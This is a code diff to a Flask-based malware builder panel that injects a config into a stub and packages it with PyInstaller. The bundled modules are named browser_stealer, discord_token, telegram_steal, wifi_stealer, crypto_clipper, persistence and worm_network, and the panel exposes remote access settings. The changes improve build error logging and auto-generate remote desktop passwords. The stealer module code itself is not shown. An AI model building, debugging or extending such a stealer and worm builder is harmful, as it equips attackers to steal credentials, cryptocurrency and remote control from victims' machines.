@@ -15,6 +15,7 @@ import hmac
 from datetime import datetime
 from functools import wraps
 from flask import Flask, request, jsonify, send_file, render_template_string, session, redirect, url_for
+import traceback
 
 # ==================== Configuration ====================
 DEFAULT_CONFIG = {
@@ -71,6 +72,9 @@ DEFAULT_CONFIG = {
     "ngrok_token": "",
     "rmm_port": 5001,
     "remote_access_password": "",
+    "remote_desktop_password": "",      # <-- added
+    "remote_desktop_port": 5000,        # <-- added
+    "filemanager_port": 3000,           # <-- added
 }   
 
 
@@ -109,7 +113,7 @@ current_config = DEFAULT_CONFIG.copy()
 # Paths
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DASHBOARD_HTML = os.path.join(BASE_DIR, 'templates', 'dashboard.html')
-STUB_PY = os.path.join(BASE_DIR, 'stub.txt')
+STUB_PY = os.path.join(BASE_DIR, 'stub.txt')          # using stub.txt
 MODULES_DIR = os.path.join(BASE_DIR, 'modules')
 UPX_DIR = os.path.join(BASE_DIR, 'upx')
 BUILDS_DIR = os.path.join(BASE_DIR, 'builds')
@@ -154,15 +158,14 @@ LOGIN_HTML = '''<!DOCTYPE html>
             text-align: center;
         }
         .logo {
-            width: 160px;  /* was 80px */
-            height: 160px; /* was 80px */
-            background: transparent; /* remove gradient */
+            width: 160px;
+            height: 160px;
+            background: transparent;
             border-radius: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 2rem auto;
-            /* remove box-shadow line */
         }
         h1 {
             font-size: 1.75rem;
@@ -238,12 +241,10 @@ LOGIN_HTML = '''<!DOCTYPE html>
         .brand-icon {
             width: 48px;
             height: 48px;
-            /* background: linear-gradient(...) */  /* Also remove gradient since you're using image */
             border-radius: var(--radius);
             display: flex;
             align-items: center;
             justify-content: center;
-            /* box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3); */  /* REMOVE THIS LINE */
         }
     </style>
 </head>
@@ -323,7 +324,6 @@ def load_dashboard_html():
         with open(DASHBOARD_HTML, 'r', encoding='utf-8') as f:
             return f.read()
     except Exception as e:
- 
         return generate_default_dashboard()
 
 def generate_default_dashboard():
@@ -354,7 +354,7 @@ def config_to_python(config):
     return json_str
 
 def replace_config_in_stub(stub_content, new_config):
-    """Replace the CONFIG dictionary in stub.py with new_config."""
+    """Replace the CONFIG dictionary in stub.txt with new_config."""
     # Pattern to find CONFIG = { ... } (multiline)
     pattern = r'(CONFIG\s*=\s*\{)([^{}]*\{[^{}]*\}[^{}]*|\s*.*?)(\n\})'
     
@@ -424,10 +424,8 @@ def load_token():
             pass
     return None
 
-
-
 def run_pyinstaller(build_dir, loader_path, settings, config=None):
-    # Run PyInstaller with the given settings 
+    # Run PyInstaller with the given settings
     cmd = ['pyinstaller', '--distpath', 'dist', '--workpath', 'build', '--specpath', '.']
 
     if settings.get('onefile'):
@@ -436,6 +434,8 @@ def run_pyinstaller(build_dir, loader_path, settings, config=None):
         cmd.append('--noconsole')
     if settings.get('clean'):
         cmd.append('--clean')
+    if settings.get('debug'):
+        cmd.append('--debug=all')          # FIXED: added =all
 
     sep = ';' if sys.platform == 'win32' else ':'
     modules_src = os.path.join(build_dir, 'modules')
@@ -446,14 +446,15 @@ def run_pyinstaller(build_dir, loader_path, settings, config=None):
 
     hidden_imports = [
         'requests', 'requests.packages.urllib3', 'paramiko', 'paramiko.transport',
-        'paramiko.client', 'cryptography', 'cryptography.hazmat', 
+        'paramiko.client', 'cryptography', 'cryptography.hazmat',
         'cryptography.hazmat.backends', 'cryptography.hazmat.primitives',
         '_cffi_backend', 'bcrypt', 'nacl', 'smbprotocol', 'wmi', 'win32com',
         'win32com.client', 'ftplib', 'socket', 'threading', 'json', 'subprocess',
         'uuid', 'struct', 'hashlib', 'time', 'os', 'datetime', 'base64',
         'tempfile', 'shutil', 'zipfile', 'psutil', 'ctypes', 'ctypes.wintypes',
         'PIL', 'PIL.Image', 'PIL.ImageGrab', 'flask', 'flask.helpers',
-        'werkzeug', 'pyautogui', 'pyautogui._pyautogui_win',
+        'werkzeug', 'werkzeug.utils', 'werkzeug.routing', 'jinja2', 'markupsafe',
+        'pyautogui', 'pyautogui._pyautogui_win',
         'mouseinfo', 'pyperclip', 'pyrect', 'pyscreeze', 'pymsgbox', 'pytweening',
         'modules.remote_access', 'modules.collected_info', 'modules.telegram_steal',
         'modules.discord_token', 'modules.browser_stealer', 'modules.persistence',
@@ -474,11 +475,24 @@ def run_pyinstaller(build_dir, loader_path, settings, config=None):
     cmd.append(loader_path)
 
     print(f"[BUILDER] Running PyInstaller...")
+    print(f"[BUILDER] Command: {' '.join(cmd)}")
+    
     result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)
 
+    log_path = os.path.join(build_dir, 'pyinstaller_log.txt')
+    with open(log_path, 'w', encoding='utf-8') as f:
+        f.write("=" * 80 + "\n")
+        f.write("PyInstaller Command:\n")
+        f.write(' '.join(cmd) + "\n\n")
+        f.write("STDOUT:\n" + result.stdout + "\n\n")
+        f.write("STDERR:\n" + result.stderr + "\n")
+        f.write("=" * 80 + "\n")
+
     if result.returncode != 0:
-        print(f"[BUILDER] PyInstaller error:\n{result.stderr}")
-        return None
+        error_msg = f"PyInstaller error (code {result.returncode}): {result.stderr[:500]}"
+        print(f"[BUILDER] {error_msg}")
+        print(f"[BUILDER] Full log: {log_path}")
+        return None, error_msg, log_path
 
     exe_name = os.path.splitext(os.path.basename(loader_path))[0]
     if sys.platform == 'win32':
@@ -489,14 +503,13 @@ def run_pyinstaller(build_dir, loader_path, settings, config=None):
         final_exe = os.path.join(build_dir, exe_name)
         if dist_exe != final_exe:
             shutil.move(dist_exe, final_exe)
-        return final_exe
+        return final_exe, "", log_path
 
-    for f in os.listdir(build_dir):
-        if f == exe_name:
-            return os.path.join(build_dir, f)
+    for root, dirs, files in os.walk(build_dir):
+        if exe_name in files:
+            return os.path.join(root, exe_name), "", log_path
 
-    return None
-
+    return None, f"Executable '{exe_name}' not found", log_path
 
 def run_build_async(build_id, build_dir, loader_path, settings, config):
     # Run PyInstaller in background thread 
@@ -504,7 +517,7 @@ def run_build_async(build_id, build_dir, loader_path, settings, config):
         build_tasks[build_id]['status'] = 'building'
         build_tasks[build_id]['progress'] = 'Running PyInstaller...'
         
-        exe_path = run_pyinstaller(build_dir, loader_path, settings, config)
+        exe_path, error_msg, log_path = run_pyinstaller(build_dir, loader_path, settings, config)
         
         if exe_path and os.path.exists(exe_path):
             # Move to output directory
@@ -524,16 +537,22 @@ def run_build_async(build_id, build_dir, loader_path, settings, config):
             build_tasks[build_id].update({
                 'status': 'failed',
                 'progress': 'Build failed - check logs',
-                'error': 'PyInstaller did not produce output file'
+                'error': error_msg,
+                'log_file': log_path
             })
+            print(f"[BUILDER] Build {build_id} FAILED: {error_msg}")
+            print(f"[BUILDER] Log saved at: {log_path}")
             
     except Exception as e:
+        
+        err_details = traceback.format_exc()
         build_tasks[build_id].update({
             'status': 'failed',
-            'progress': f'Error: {str(e)}',
-            'error': str(e)
+            'progress': f'Exception: {str(e)}',
+            'error': str(e),
+            'traceback': err_details
         })
-
+        print(f"[BUILDER] Exception in build {build_id}:\n{err_details}")
 
 @app.route('/api/build/status/<build_id>')
 @token_required
@@ -590,6 +609,19 @@ def build():
             return a
         current_config = deep_merge(current_config, data)
 
+    # Auto‑generate remote_desktop_password if empty
+    import secrets, string
+    def _gen_pass(length=16):
+        alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
+        return ''.join(secrets.choice(alphabet) for _ in range(length))
+    
+    if not current_config.get('remote_desktop_password'):
+        current_config['remote_desktop_password'] = _gen_pass()
+        print(f"[BUILDER] Auto‑generated remote_desktop_password: {current_config['remote_desktop_password']}")
+    
+    if not current_config.get('remote_access_password'):
+        current_config['remote_access_password'] = current_config['remote_desktop_password']
+
     # Generate unique build ID
     build_id = str(uuid.uuid4())[:8]
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -613,6 +645,9 @@ def build():
                 shutil.copy2(src, build_dir)
 
         # Read stub and inject config
+        if not os.path.exists(STUB_PY):
+            return jsonify({'success': False, 'message': f'Stub file not found: {STUB_PY}'}), 400
+
         with open(STUB_PY, 'r', encoding='utf-8') as f:
             stub_content = f.read()
 
@@ -630,13 +665,16 @@ def build():
             'build_dir': build_dir
         }
 
+        # Use original settings (no forced console)
+        build_settings = current_config['pyinstaller_settings'].copy()
+
         # Start build in background thread
-        future = executor.submit(
+        executor.submit(
             run_build_async,
             build_id,
             build_dir,
             loader_path,
-            current_config['pyinstaller_settings'],
+            build_settings,
             current_config
         )
 
@@ -651,7 +689,6 @@ def build():
 
     except Exception as e:
         return jsonify({'success': False, 'message': str(e)}), 500
-
 
 
 # ==================== Routes ====================
@@ -740,6 +777,17 @@ def save_config():
             current_config = deep_merge(current_config, data)
             current_config['last_updated'] = datetime.now().isoformat()
 
+            # Auto‑generate missing password on save as well
+            import secrets, string
+            def _gen_pass(length=16):
+                alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
+                return ''.join(secrets.choice(alphabet) for _ in range(length))
+            
+            if not current_config.get('remote_desktop_password'):
+                current_config['remote_desktop_password'] = _gen_pass()
+            if not current_config.get('remote_access_password'):
+                current_config['remote_access_password'] = current_config['remote_desktop_password']
+
             try:
                 with open('config_db.json', 'w', encoding='utf-8') as f:
                     json.dump(current_config, f, indent=2)
@@ -754,98 +802,6 @@ def save_config():
         return jsonify({'success': False, 'message': str(e)}), 400
 
     return jsonify({'success': False, 'message': 'No data provided'}), 400
-
-# @app.route('/api/build', methods=['POST'])
-# @token_required
-# def build():
-#     global current_config
-#     data = request.get_json()
-    
-#     if data:
-#         def deep_merge(a, b):
-#             for key in b:
-#                 if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
-#                     deep_merge(a[key], b[key])
-#                 else:
-#                     a[key] = b[key]
-#             return a
-
-#         current_config = deep_merge(current_config, data)
-
-#     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-#     build_dir = os.path.join(BUILDS_DIR, f'build_{timestamp}')
-#     os.makedirs(build_dir, exist_ok=True)
-
-#     try:
-#         # Copy modules
-#         dest_modules = os.path.join(build_dir, 'modules')
-#         if os.path.exists(MODULES_DIR):
-#             shutil.copytree(MODULES_DIR, dest_modules)
-#             print(f"[BUILDER] Copied modules")
-
-#         # Copy essential files
-#         essential_files = ['remote_access.py', 'collected_info.py', 'telegram_steal.py', 
-#                           'discord_token.py', 'browser_stealer.py', 'persistence.py',
-#                           'wifi_stealer.py', 'bot.py', 'crypto_clipper.py', 
-#                           'worm_network.py', 'process_manager.py']
-        
-#         for fname in essential_files:
-#             src = os.path.join(MODULES_DIR, fname)
-#             if os.path.exists(src):
-#                 shutil.copy2(src, build_dir)
-
-#         # Read stub and inject config
-#         if not os.path.exists(STUB_PY):
-#             return jsonify({
-#                 'success': False,
-#                 'message': f'stub.py not found at: {STUB_PY}'
-#             }), 400
-
-#         with open(STUB_PY, 'r', encoding='utf-8') as f:
-#             stub_content = f.read()
-
-#         loader_content = replace_config_in_stub(stub_content, current_config)
-
-#         loader_path = os.path.join(build_dir, 'loader.py')
-#         with open(loader_path, 'w', encoding='utf-8') as f:
-#             f.write(loader_content)
-#             print(f"[BUILDER] Created loader.py with injected config")
-
-#         # Run PyInstaller
-#         exe_path = run_pyinstaller(
-#             build_dir, 
-#             loader_path, 
-#             current_config['pyinstaller_settings'], 
-#             current_config
-#         )
-
-#         if not exe_path:
-#             return jsonify({
-#                 'success': False, 
-#                 'message': 'Build failed - check console for errors'
-#             }), 500
-
-#         # Move to output
-#         exe_name = f"Client_{timestamp}.exe" if sys.platform == 'win32' else f"Client_{timestamp}"
-#         final_exe = os.path.join(STATIC_DIR, exe_name)
-
-#         if os.path.exists(final_exe):
-#             os.remove(final_exe)
-
-#         shutil.move(exe_path, final_exe)
-#         print(f"[BUILDER] Build successful: {final_exe}")
-
-#         return jsonify({
-#             'success': True, 
-#             'download_url': f'/download/{exe_name}',
-#             'filename': exe_name
-#         })
-
-#     except Exception as e:
-#         print(f"[BUILDER] Build error: {e}")
-#         import traceback
-#         traceback.print_exc()
-#         return jsonify({'success': False, 'message': str(e)}), 500
 
 @app.route('/download/<path:filename>')
 @token_required
